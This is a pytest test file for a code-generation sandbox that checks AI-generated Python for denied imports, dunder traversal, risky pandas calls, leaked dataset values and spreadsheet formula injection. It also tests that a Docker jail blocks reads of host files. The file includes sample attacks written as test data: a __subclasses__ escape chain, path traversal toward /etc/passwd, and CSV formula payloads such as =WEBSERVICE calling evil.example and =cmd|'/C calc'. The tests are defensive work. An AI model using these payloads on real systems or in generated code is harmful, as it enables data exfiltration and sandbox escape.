"""Rewrite plan step 9: the codegen safety machinery
(``agents/codegen.py``). Static-analysis coverage requires no Docker and
always runs; the sandboxed (multiprocessing, no Docker) coverage for the
two real-data-touching checks (dataset literals, output formula content)
always runs too; only the container-boundary tests that prove the
bypasses ``check_generated_code`` deliberately does not catch statically
are still refused end to end need Docker and the
``phi-sandbox-runner:local`` image (see ``test_container_runner.py``'s
own module docstring) and skip cleanly without either.
"""
from __future__ import annotations

import json
import shutil
import subprocess
import uuid
from pathlib import Path

import pytest
from phi_core.agents.codegen import (
    PANDAS_ALLOWED_METHODS,
    STATIC_CHECK_ALLOWED_IMPORTS,
    CodeGenerationExhausted,
    _AttemptFailure,
    _is_formula_trigger_value,
    _is_numeric_or_boolean_ish,
    _strip_code_fences,
    _try_one_generation,
    assert_no_dataset_literals,
    assert_no_formula_injection_in_outputs,
    check_entrypoint_shape,
    check_generated_code,
    generate_with_retry,
    run_generated,
    snapshot_workspace,
    workspace_diff_check,
)
from phi_core.control.runner import (
    DEFAULT_IMAGE,
    RESULT_FILENAME,
    ContainerRunResult,
    ContainerWorkerFailure,
)
from phi_core.control.sandbox import create_sandbox, destroy_sandbox


def _docker_available() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        proc = subprocess.run(["docker", "info"], capture_output=True, timeout=10, check=False)
    except (OSError, subprocess.TimeoutExpired):
        return False
    return proc.returncode == 0


def _image_available() -> bool:
    try:
        proc = subprocess.run(
            ["docker", "image", "inspect", DEFAULT_IMAGE], capture_output=True, timeout=10, check=False,
        )
    except (OSError, subprocess.TimeoutExpired):
        return False
    return proc.returncode == 0


needs_docker = pytest.mark.skipif(not _docker_available(), reason="docker not reachable on this host")
needs_image = pytest.mark.skipif(
    _docker_available() and not _image_available(),
    reason=f"{DEFAULT_IMAGE} not built -- run `docker build` in backend/sandbox-runner/",
)


# ---------------------------------------------------------------------------
# check_generated_code: the trivial six.
# ---------------------------------------------------------------------------


def test_import_os_denied():
    assert any("import_denied" in v and "'os'" in v for v in check_generated_code("import os\n"))


def test_import_subprocess_denied():
    assert any("import_denied" in v and "'subprocess'" in v for v in check_generated_code("import subprocess\n"))


def test_bare_eval_call_denied():
    assert any("name_denied" in v and "'eval'" in v for v in check_generated_code("eval('1 + 1')\n"))


def test_dunder_import_denied():
    assert any("name_denied" in v and "'__import__'" in v for v in check_generated_code("__import__('os')\n"))


def test_syntax_error_is_itself_a_violation():
    violations = check_generated_code("def broken(:\n    pass\n")
    assert violations and violations[0].startswith("syntax_error")


def test_open_of_absolute_path_is_not_a_static_violation():
    """``open`` is deliberately not in the static denylist (plan step
    9): the container filesystem jail from step 5 is the real control
    against path escape, not a string-literal heuristic. This test
    documents that fact for check_generated_code specifically; the
    container-boundary test below proves the real control still holds."""
    assert check_generated_code("open('/etc/passwd')\n") == []


# ---------------------------------------------------------------------------
# check_generated_code: the non-trivial bypasses.
# ---------------------------------------------------------------------------


def test_dunder_traversal_denied():
    violations = check_generated_code("x = ().__class__.__bases__[0].__subclasses__()\n")
    assert any("__class__" in v for v in violations)
    assert any("__bases__" in v for v in violations)
    assert any("__subclasses__" in v for v in violations)


def test_pandas_read_pickle_denied_even_though_pandas_is_an_allowed_import():
    source = "import pandas as pd\ndf = pd.read_pickle('x.pkl')\n"
    assert "pandas" in STATIC_CHECK_ALLOWED_IMPORTS
    violations = check_generated_code(source)
    assert any("pandas_method_denied" in v and "read_pickle" in v for v in violations)


def test_pandas_read_pickle_imported_as_a_bare_name_still_denied():
    """The attribute-access form (``pd.read_pickle``) is caught by the
    Attribute check above; a bare name pulled out of an allowed module
    via ``from ... import ...`` is a completely different AST shape
    (a ``Name`` load, never an ``Attribute``) and needs its own check at
    the ``ImportFrom`` node -- this is the exact bypass that shipped
    uncaught until this test was added."""
    violations = check_generated_code("from pandas import read_pickle\nread_pickle('x.pkl')\n")
    assert any("pandas_method_denied" in v and "read_pickle" in v for v in violations)


def test_pandas_wildcard_import_denied():
    """A star import from an allowed module can bring in anything the
    module exports, including every denied name, without any of them
    ever appearing as an inspectable ``alias.name`` -- so it must be
    denied outright rather than relying on catching the later use."""
    violations = check_generated_code("from pandas import *\n")
    assert any("import_denied" in v and "wildcard" in v for v in violations)


def test_pandas_read_html_denied():
    violations = check_generated_code("import pandas as pd\npd.read_html('x')\n")
    assert any("pandas_method_denied" in v and "read_html" in v for v in violations)


def test_pandas_to_sql_and_read_sql_and_read_parquet_and_to_pickle_and_query_denied():
    for call in ("df.to_sql('t', conn)", "pd.read_sql('q', conn)", "pd.read_parquet('x')",
                 "df.to_pickle('x')", "df.query('a > 1')"):
        source = f"import pandas as pd\n{call}\n"
        violations = check_generated_code(source)
        assert violations, f"expected a violation for: {call}"


def test_formula_injection_literal_is_not_a_static_source_violation():
    """A string literal in *source* starting with a formula-trigger
    character is deliberately not flagged here: the same shape is
    completely ordinary in legitimate code (``"key=value".split("=")``,
    ``separator = "="``), and a source-text check cannot see a value
    built at runtime or passed through untouched from real input data
    either way. The actual formula-injection control is
    ``assert_no_formula_injection_in_outputs``, checked against real
    produced cell content -- see that section below."""
    source = "ws['A1'] = '=WEBSERVICE(\"http://evil.example/\" & A2)'\n"
    assert check_generated_code(source) == []
    assert check_generated_code("parts = 'key=value'.split('=')\n") == []
    assert check_generated_code("separator = '='\n") == []


def test_runtime_constructed_escape_path_is_not_a_static_violation():
    """A path built via string concatenation at runtime, never a
    suspicious literal, defeats any string-literal heuristic by
    construction -- which is exactly why plan step 9 drops that
    heuristic and relies on the container filesystem jail instead. This
    documents check_generated_code's own boundary; the container test
    below proves the real control."""
    source = "p = '../' * 6 + 'etc/passwd'\nopen(p)\n"
    assert check_generated_code(source) == []


# ---------------------------------------------------------------------------
# check_generated_code: legitimate code passes clean.
# ---------------------------------------------------------------------------


def test_legitimate_extraction_module_passes_clean():
    source = """
import csv
import json
from pathlib import Path
import pandas as pd

def extract(dataset_path, out_path):
    df = pd.read_csv(dataset_path, dtype=str)
    columns = [{"name": c, "position": i} for i, c in enumerate(df.columns)]
    Path(out_path).write_text(json.dumps({"columns": columns}))
    return out_path
"""
    assert check_generated_code(source) == []


def test_legitimate_transformation_module_using_every_allowed_pandas_method_passes_clean():
    lines = ["import pandas as pd", "df = pd.DataFrame()"]
    for method in sorted(PANDAS_ALLOWED_METHODS - {"read_csv", "read_excel", "DataFrame", "Series", "concat", "merge"}):
        lines.append(f"df.{method}")
    source = "\n".join(lines) + "\n"
    assert check_generated_code(source) == []


def test_attribute_chain_rooted_at_denied_module_is_caught_even_without_a_dunder_shield():
    """A deep chain rooted at a denied module, with no dunder anywhere
    in it and no ``import`` statement at all (the root is just a bare
    name the AST cannot resolve to a real module, which is exactly the
    case a static check must still catch), is caught specifically by
    ``module_root_denied`` -- checked directly rather than folded into
    an ``or`` against the unrelated dunder check, so this test cannot
    silently pass for the wrong reason."""
    violations = check_generated_code("shutil.rmtree('/x')\n")
    assert any("module_root_denied" in v and "'shutil'" in v for v in violations)
    violations2 = check_generated_code("urllib.request.urlopen('http://x')\n")
    assert any("module_root_denied" in v and "'urllib'" in v for v in violations2)


def test_attribute_chain_rooted_at_denied_module_is_also_caught_alongside_a_dunder_access():
    """When a dunder access and a denied-module-root chain both appear
    (``shutil.rmtree.__module__``), each is its own AST node and each
    fires its own, independent violation -- neither check's ``continue``
    suppresses the other."""
    violations = check_generated_code("y = shutil.rmtree.__module__\n")
    assert any("dunder_attribute_denied" in v for v in violations)
    assert any("module_root_denied" in v and "'shutil'" in v for v in violations)


# ---------------------------------------------------------------------------
# check_entrypoint_shape: a separate structural check from
# check_generated_code, since generated source must define exactly the
# entrypoint run_generated/ContainerRunner will call.
# ---------------------------------------------------------------------------


def test_check_entrypoint_shape_requires_a_top_level_run_function():
    assert check_entrypoint_shape("import json\n") == ["missing_entrypoint: no top-level def run(...) found"]


def test_check_entrypoint_shape_accepts_def_run_and_async_def_run():
    assert check_entrypoint_shape("def run():\n    return 1\n") == []
    assert check_entrypoint_shape("async def run():\n    return 1\n") == []


def test_check_entrypoint_shape_rejects_a_nested_or_differently_named_function():
    assert check_entrypoint_shape("def outer():\n    def run():\n        return 1\n    return run\n") == \
        ["missing_entrypoint: no top-level def run(...) found"]
    assert check_entrypoint_shape("def main():\n    return 1\n") == \
        ["missing_entrypoint: no top-level def run(...) found"]


def test_check_entrypoint_shape_does_not_re_diagnose_a_syntax_error():
    # check_generated_code already reports this; an unparseable source
    # has no "top level" for this function to inspect.
    assert check_entrypoint_shape("def broken(:\n    pass\n") == []


# ---------------------------------------------------------------------------
# _strip_code_fences: LLMs commonly wrap generated source in Markdown
# fences; this must be stripped before ast.parse ever sees it.
# ---------------------------------------------------------------------------


def test_strip_code_fences_removes_a_python_labelled_fence():
    fenced = "```python\ndef run():\n    return 1\n```"
    assert _strip_code_fences(fenced) == "def run():\n    return 1"


def test_strip_code_fences_removes_a_bare_fence():
    fenced = "```\ndef run():\n    return 1\n```"
    assert _strip_code_fences(fenced) == "def run():\n    return 1"


def test_strip_code_fences_is_a_no_op_on_unfenced_source():
    assert _strip_code_fences("def run():\n    return 1") == "def run():\n    return 1"


@pytest.mark.asyncio
async def test_try_one_generation_strips_a_markdown_fence_before_static_checks():
    """Proves the fence markers are stripped *before* ast.parse, not
    merely tolerated: a fenced reply containing a denied import must
    still be caught as import_denied, never misreported as a bare
    syntax_error from the literal ```` ``` ```` tokens."""
    outcome = await _try_one_generation(
        source="```python\nimport os\ndef run():\n    return os.getcwd()\n```",
        dataset_path="/nonexistent.csv", inputs={}, entrypoint="extract.py",
        declared_outputs=frozenset(), sandbox=None,  # type: ignore[arg-type]
    )
    assert isinstance(outcome, _AttemptFailure)
    assert any("import_denied" in d for d in outcome.diagnostics)
    assert not any(d.startswith("syntax_error") for d in outcome.diagnostics)


def _raiser(exc: BaseException):
    """A plain callable that raises ``exc`` when invoked with any
    arguments -- used below to monkeypatch a sandboxed check into
    failing, more readable than a generator-throw one-liner."""
    def _raise(*_args, **_kwargs):
        raise exc
    return _raise


@pytest.mark.asyncio
async def test_try_one_generation_converts_a_dataset_literal_check_timeout_into_an_attempt_failure(monkeypatch):
    """If the sandboxed literal check itself fails to complete (a
    genuine SandboxTimeout, not a "clean"/"dirty" verdict), that must
    never escape _try_one_generation uncaught -- generate_with_retry's
    whole loop would crash instead of recording a retry diagnostic and
    trying again."""
    import phi_core.agents.codegen as codegen_module
    from phi_core.control.sandbox import SandboxTimeout

    monkeypatch.setattr(codegen_module, "assert_no_dataset_literals", _raiser(SandboxTimeout(5)))
    outcome = await _try_one_generation(
        source="def run():\n    return 'x'\n", dataset_path="/nonexistent.csv", inputs={},
        entrypoint="extract.py", declared_outputs=frozenset(), sandbox=None,  # type: ignore[arg-type]
    )
    assert isinstance(outcome, _AttemptFailure)
    assert any("dataset_literal_check_timeout" in d for d in outcome.diagnostics)


@pytest.mark.asyncio
async def test_try_one_generation_converts_a_formula_scan_crash_into_an_attempt_failure(monkeypatch, tmp_path):
    """Same property, one step later: if the output-content formula
    scan raises (a malformed file the generated code wrote, or a
    sandbox failure) rather than returning a verdict, the attempt must
    still fail gracefully, with the successful container result
    cleaned up rather than leaked -- pinned below by asserting the
    staging directory is actually gone, not merely that cleanup() was
    reachable."""
    import phi_core.agents.codegen as codegen_module
    from phi_core.control.runner import ContainerRunResult
    from phi_core.control.sandbox import SandboxError

    (tmp_path / "out.csv").write_text("x\n")
    fake_result = ContainerRunResult(
        payload="out.csv", workspace_path=tmp_path, staging_dir=tmp_path,
        runtime_used="none", memory_ceiling_enforced=False, wall_seconds=0.1,
    )
    monkeypatch.setattr(codegen_module, "assert_no_dataset_literals", lambda *a, **k: (False, 0))
    monkeypatch.setattr(codegen_module, "run_generated", lambda *a, **k: fake_result)
    monkeypatch.setattr(
        codegen_module, "assert_no_formula_injection_in_outputs", _raiser(SandboxError("boom")),
    )

    outcome = await _try_one_generation(
        source="def run():\n    return 'out.csv'\n", dataset_path="/nonexistent.csv", inputs={},
        entrypoint="extract.py", declared_outputs=frozenset({"out.csv"}), sandbox=None,  # type: ignore[arg-type]
    )
    assert isinstance(outcome, _AttemptFailure)
    assert any("formula_scan_failed" in d for d in outcome.diagnostics)
    assert not tmp_path.exists(), "the container staging tree must be cleaned up, not leaked, on this failure path"


# ---------------------------------------------------------------------------
# assert_no_dataset_literals: needs a real sandbox (multiprocessing, no
# Docker required -- this is control/sandbox.py's boundary, not
# control/runner.py's).
# ---------------------------------------------------------------------------


@pytest.fixture()
def dataset_csv(tmp_path: Path) -> Path:
    path = tmp_path / "dataset.csv"
    path.write_text("name,site\nJohn Smith,Springfield General\nJane Doe,Riverside Clinic\n")
    return path


@pytest.fixture()
def sandbox_record():
    record = create_sandbox(run_id=uuid.uuid4().hex)
    try:
        yield record
    finally:
        destroy_sandbox(record)


def test_assert_no_dataset_literals_clean_when_source_has_no_real_values(sandbox_record, dataset_csv):
    source = "def f():\n    return 'hello world this is fine'\n"
    hit, count = assert_no_dataset_literals(sandbox_record, source, str(dataset_csv))
    assert hit is False
    assert count == 0


def test_assert_no_dataset_literals_flags_an_inlined_real_lookup_value(sandbox_record, dataset_csv):
    source = "FACILITY_MAP = {'F1': 'Springfield General'}\n"
    hit, count = assert_no_dataset_literals(sandbox_record, source, str(dataset_csv))
    assert hit is True
    assert count >= 1


def test_assert_no_dataset_literals_short_literals_excluded_to_avoid_noise(sandbox_record, dataset_csv):
    # Single/short literals ("a", "no") are excluded from the scan --
    # see _extract_string_literals's own len(...) >= 4 threshold.
    source = "x = 'no'\n"
    hit, count = assert_no_dataset_literals(sandbox_record, source, str(dataset_csv))
    assert hit is False
    assert count == 0


def test_is_numeric_or_boolean_ish_excludes_sentinels_and_flags_are_not():
    for token in ("9999", "-99", "3.14", "0", "true", "FALSE", "Yes", "n/a"):
        assert _is_numeric_or_boolean_ish(token) is True, token
    for token in ("Springfield", "Jane Doe", "clinic"):
        assert _is_numeric_or_boolean_ish(token) is False, token


def test_assert_no_dataset_literals_does_not_flag_a_legitimate_categorical_recode(sandbox_record, tmp_path):
    """A generic sex/marital-status style recode whose *values* happen
    to be common numeric-shaped codes must not be flagged even when a
    real dataset column also contains those exact digit-strings -- the
    security-relevant case is a real *identifying* value (a name, a
    facility) inlined into a lookup table, not a short numeric sentinel
    that recurs constantly in ordinary categorical data."""
    dataset = tmp_path / "dataset.csv"
    dataset.write_text("sex_code\n1001\n1002\n1001\n")
    source = "RECODE = {'1001': '1001', '1002': '1002'}\n"  # numeric-shaped values, excluded regardless of overlap
    hit, count = assert_no_dataset_literals(sandbox_record, source, str(dataset))
    assert hit is False
    assert count == 0


def test_assert_no_dataset_literals_known_safe_values_excludes_a_real_code_map_value(sandbox_record, dataset_csv):
    """``known_safe_values`` is the hook Executor's rewrite (step 11) is
    expected to populate from the run's own StudyKnowledgePackage code
    maps: a value the run's own dictionary already declares as a
    legitimate label must not independently trip this check just
    because it happens to also appear in the dataset."""
    source = "SITE_LABEL = 'Springfield General'\n"
    hit_without, _ = assert_no_dataset_literals(sandbox_record, source, str(dataset_csv))
    assert hit_without is True
    hit_with, count_with = assert_no_dataset_literals(
        sandbox_record, source, str(dataset_csv), known_safe_values=frozenset({"Springfield General"}),
    )
    assert hit_with is False
    assert count_with == 0


# ---------------------------------------------------------------------------
# assert_no_formula_injection_in_outputs: the output-content analogue of
# assert_no_dataset_literals -- also needs only the sandbox, not Docker.
# ---------------------------------------------------------------------------


def test_is_formula_trigger_value_flags_the_owasp_leading_characters():
    for value in ("=WEBSERVICE(...)", "@SUM(A1:A2)", "-cmd|'/C calc'!A1", "+HYPERLINK(...)"):
        assert _is_formula_trigger_value(value) is True, value


def test_is_formula_trigger_value_does_not_flag_a_numeric_sentinel():
    for value in ("-99", "+1", "-3.14", "", "Springfield General"):
        assert _is_formula_trigger_value(value) is False, value


def test_assert_no_formula_injection_in_outputs_clean_for_ordinary_content(sandbox_record, tmp_path):
    output = tmp_path / "out.csv"
    output.write_text("age,note\n45,stable\n-99,missing\n")
    hit, count = assert_no_formula_injection_in_outputs(sandbox_record, [str(output)])
    assert hit is False
    assert count == 0


def test_assert_no_formula_injection_in_outputs_flags_an_external_link_formula_cell(sandbox_record, tmp_path):
    output = tmp_path / "out.csv"
    output.write_text('age,note\n45,"=WEBSERVICE(\\"http://evil.example/\\")"\n')
    hit, count = assert_no_formula_injection_in_outputs(sandbox_record, [str(output)])
    assert hit is True
    assert count >= 1


def test_assert_no_formula_injection_in_outputs_handles_tab_separated_output(sandbox_record, tmp_path):
    """A genuinely tab-separated ``.tsv`` output must be split on tabs,
    not the csv default comma -- reading it with the wrong separator
    collapses each row into a single string-valued column and silently
    misses every embedded formula trigger (verified empirically before
    this test existed: this exact scenario returned a false-clean 0)."""
    output = tmp_path / "out.tsv"
    output.write_text('age\tnote\n45\t=WEBSERVICE("http://evil.example/")\n')
    hit, count = assert_no_formula_injection_in_outputs(sandbox_record, [str(output)])
    assert hit is True
    assert count >= 1


def test_assert_no_formula_injection_in_outputs_checks_the_header_row_too(sandbox_record, tmp_path):
    """Excel does not distinguish a header cell from a data cell when
    deciding whether to interpret it as a formula on open -- a trigger
    value in row 0 alone (every data row otherwise clean) must still be
    caught, which requires reading with ``header=None``."""
    output = tmp_path / "out.csv"
    output.write_text("=cmd|'/C calc'!A1,note\n45,stable\n")
    hit, count = assert_no_formula_injection_in_outputs(sandbox_record, [str(output)])
    assert hit is True
    assert count >= 1


def test_assert_no_formula_injection_in_outputs_empty_paths_is_clean(sandbox_record):
    assert assert_no_formula_injection_in_outputs(sandbox_record, []) == (False, 0)


# ---------------------------------------------------------------------------
# workspace_diff_check / snapshot_workspace: pure logic, no I/O boundary.
# ---------------------------------------------------------------------------


def test_workspace_diff_check_passes_when_exactly_the_declared_outputs_were_created():
    before = frozenset()
    after = frozenset({"out.csv"})
    assert workspace_diff_check(before, after, frozenset({"out.csv"})) is True


def test_workspace_diff_check_fails_on_an_extra_undeclared_artifact():
    before = frozenset()
    after = frozenset({"out.csv", "unexpected.txt"})
    assert workspace_diff_check(before, after, frozenset({"out.csv"})) is False


def test_workspace_diff_check_fails_on_a_missing_declared_output():
    before = frozenset()
    after = frozenset()
    assert workspace_diff_check(before, after, frozenset({"out.csv"})) is False


def test_snapshot_workspace_returns_empty_set_for_a_nonexistent_directory(tmp_path):
    assert snapshot_workspace(tmp_path / "does-not-exist") == frozenset()


def test_snapshot_workspace_lists_relative_filenames(tmp_path):
    (tmp_path / "a.csv").write_text("x")
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "b.json").write_text("{}")
    assert snapshot_workspace(tmp_path) == frozenset({"a.csv", str(Path("sub") / "b.json")})


def test_snapshot_workspace_includes_the_container_result_bookkeeping_file_unfiltered(tmp_path):
    """snapshot_workspace itself is a raw listing -- it does NOT filter
    RESULT_FILENAME. Excluding it is _try_one_generation's job (see the
    regression test in the container-boundary section below), so this
    test pins the raw, unfiltered contract snapshot_workspace itself
    promises and must keep promising."""
    (tmp_path / "out.csv").write_text("x")
    (tmp_path / RESULT_FILENAME).write_text("{}")
    assert snapshot_workspace(tmp_path) == frozenset({"out.csv", RESULT_FILENAME})


# ---------------------------------------------------------------------------
# generate_with_retry: the bounded retry loop, driven with a fake agent
# so the retry/exhaustion/prompt-rebuild logic is testable without a
# live LLM or Docker.
# ---------------------------------------------------------------------------


class _FakeAgent:
    def __init__(self, replies: list[str]) -> None:
        self._replies = list(replies)
        self.calls: list[str] = []

    async def call(self, prompt: str, *, phase: str, timeout_s=None) -> str:
        self.calls.append(prompt)
        return self._replies.pop(0)


@pytest.mark.asyncio
async def test_generate_with_retry_exhausts_after_two_failing_static_checks(sandbox_record, dataset_csv):
    agent = _FakeAgent(["import os\n", "import sys\n"])
    prompts_seen: list[tuple] = []

    def build_prompt(previous_source, previous_diagnostics):
        prompts_seen.append((previous_source, previous_diagnostics))
        return "generate the module"

    with pytest.raises(CodeGenerationExhausted) as excinfo:
        await generate_with_retry(
            agent, build_prompt, phase="codegen.test", dataset_path=str(dataset_csv),
            inputs={}, entrypoint="extract.py", declared_outputs=frozenset({"out.json"}),
            sandbox=sandbox_record, attempts=2,
        )
    assert len(agent.calls) == 2
    # Second prompt build must have received the first attempt's source
    # and structured diagnostics -- never empty, never the raw exception.
    assert prompts_seen[1][0] == "import os\n"
    assert any("import_denied" in d for d in prompts_seen[1][1])
    assert any("import_denied" in d for d in excinfo.value.diagnostics)


@pytest.mark.asyncio
async def test_generate_with_retry_exhausts_immediately_on_empty_reply_then_recovers_diagnostics():
    agent = _FakeAgent(["", ""])

    with pytest.raises(CodeGenerationExhausted) as excinfo:
        await generate_with_retry(
            agent, lambda prev, diag: "prompt", phase="codegen.test", dataset_path="/nonexistent.csv",
            inputs={}, entrypoint="extract.py", declared_outputs=frozenset(), sandbox=None,  # type: ignore[arg-type]
            attempts=2,
        )
    assert any("empty_reply" in d for d in excinfo.value.diagnostics)


@pytest.mark.asyncio
async def test_try_one_generation_returns_attempt_failure_not_a_result_on_static_violation():
    outcome = await _try_one_generation(
        source="import os\n", dataset_path="/nonexistent.csv", inputs={}, entrypoint="extract.py",
        declared_outputs=frozenset(), sandbox=None,  # type: ignore[arg-type]
    )
    assert isinstance(outcome, _AttemptFailure)
    assert not isinstance(outcome, ContainerRunResult)


# ---------------------------------------------------------------------------
# Container-boundary proof: the two bypasses check_generated_code does
# not catch statically are still refused end to end by the real
# filesystem jail. Needs Docker + the built image.
# ---------------------------------------------------------------------------


@needs_docker
@needs_image
def test_container_boundary_refuses_open_of_an_absolute_host_path(tmp_path):
    """An absolute path pointing at a real host file that was never
    bind-mounted into the container must be unreadable: the container's
    own filesystem namespace simply does not contain it, regardless of
    Unix permission bits. (``/etc/passwd`` is deliberately not used as
    the target here: it is the container's *own* image file, world-
    readable by design -- reading it proves nothing about host-path
    escape, and asserting only "some exception fires" without checking
    its kind is vacuous, since ``run()`` returning no value is itself
    enough to trip an unrelated return-contract exception regardless of
    whether the read succeeded.)"""
    secret = tmp_path / "host-secret.txt"
    secret.write_text("HOST-ONLY-SECRET-MUST-NEVER-BE-READABLE\n")
    source = (
        "def run():\n"
        f"    with open({str(secret)!r}) as fh:\n"
        "        data = fh.read()\n"
        "    with open('/workspace/out.txt', 'w') as fh:\n"
        "        fh.write(data)\n"
        "    return 'out.txt'\n"
    )
    assert check_generated_code(source) == []
    with pytest.raises(ContainerWorkerFailure) as excinfo:
        result = run_generated({"entry.py": source}, "entry.py", {}, timeout_s=15)
        result.cleanup()
    assert excinfo.value.kind == "FileNotFoundError"


@needs_docker
@needs_image
def test_container_boundary_refuses_a_runtime_constructed_path_escape(tmp_path):
    """The same property as above, but the path is assembled at runtime
    from two components joined with ``+`` -- never a single literal any
    static heuristic could flag -- exactly the gap
    ``check_generated_code``'s own docstring names as the container
    boundary's job, not a static check's."""
    secret = tmp_path / "host-secret.txt"
    secret.write_text("HOST-ONLY-SECRET-MUST-NEVER-BE-READABLE\n")
    source = (
        "def run():\n"
        f"    base = {str(secret.parent)!r}\n"
        f"    name = {secret.name!r}\n"
        "    p = base + '/' + name\n"
        "    with open(p) as fh:\n"
        "        data = fh.read()\n"
        "    with open('/workspace/out.txt', 'w') as fh:\n"
        "        fh.write(data)\n"
        "    return 'out.txt'\n"
    )
    assert check_generated_code(source) == []
    with pytest.raises(ContainerWorkerFailure) as excinfo:
        result = run_generated({"entry.py": source}, "entry.py", {}, timeout_s=15)
        result.cleanup()
    assert excinfo.value.kind == "FileNotFoundError"


@needs_docker
@needs_image
def test_container_boundary_round_trips_a_legitimate_extraction_script():
    source = (
        "import json\n"
        "def run():\n"
        "    with open('/workspace/out.json', 'w') as fh:\n"
        "        json.dump({'ok': True}, fh)\n"
        "    return 'out.json'\n"
    )
    assert check_generated_code(source) == []
    result = run_generated({"entry.py": source}, "entry.py", {}, timeout_s=15)
    try:
        assert result.payload == "out.json"
        written = result.workspace_path / result.payload
        assert written.is_file()
        assert json.loads(written.read_text()) == {"ok": True}
    finally:
        result.cleanup()


@needs_docker
@needs_image
def test_container_run_leaves_the_result_bookkeeping_file_in_the_workspace():
    """Regression pin for the RESULT_FILENAME exclusion _try_one_
    generation must apply: ContainerRunner always leaves its own
    bookkeeping file in the workspace, so a caller comparing a raw
    snapshot_workspace() against declared_outputs without excluding it
    would see a phantom extra artifact on every single run, success or
    not."""
    source = "def run():\n    open('/workspace/ignored.txt', 'w').write('x')\n    return 'ignored.txt'\n"
    result = run_generated({"entry.py": source}, "entry.py", {}, timeout_s=15)
    try:
        after = snapshot_workspace(result.workspace_path)
        assert RESULT_FILENAME in after
    finally:
        result.cleanup()


@needs_docker
@needs_image
@pytest.mark.asyncio
async def test_generate_with_retry_succeeds_end_to_end_against_a_real_container(sandbox_record, dataset_csv):
    """The full success path, not just the failure/exhaustion paths
    covered above: a legitimate first-attempt reply must actually
    return a ``ContainerRunResult`` from ``generate_with_retry`` itself.
    Before the RESULT_FILENAME exclusion fix, this could never pass --
    workspace_diff_check always saw the bookkeeping file as an
    undeclared extra artifact and every attempt exhausted."""
    source = (
        "import json\n"
        "def run():\n"
        "    with open('/workspace/out.json', 'w') as fh:\n"
        "        json.dump({'ok': True}, fh)\n"
        "    return 'out.json'\n"
    )
    agent = _FakeAgent([source])

    result_source, result = await generate_with_retry(
        agent, lambda prev, diag: "generate the module", phase="codegen.test",
        dataset_path=str(dataset_csv), inputs={}, entrypoint="extract.py",
        declared_outputs=frozenset({"out.json"}), sandbox=sandbox_record, attempts=2,
    )
    try:
        assert result_source == source
        assert isinstance(result, ContainerRunResult)
        written = result.workspace_path / "out.json"
        assert json.loads(written.read_text()) == {"ok": True}
    finally:
        result.cleanup()
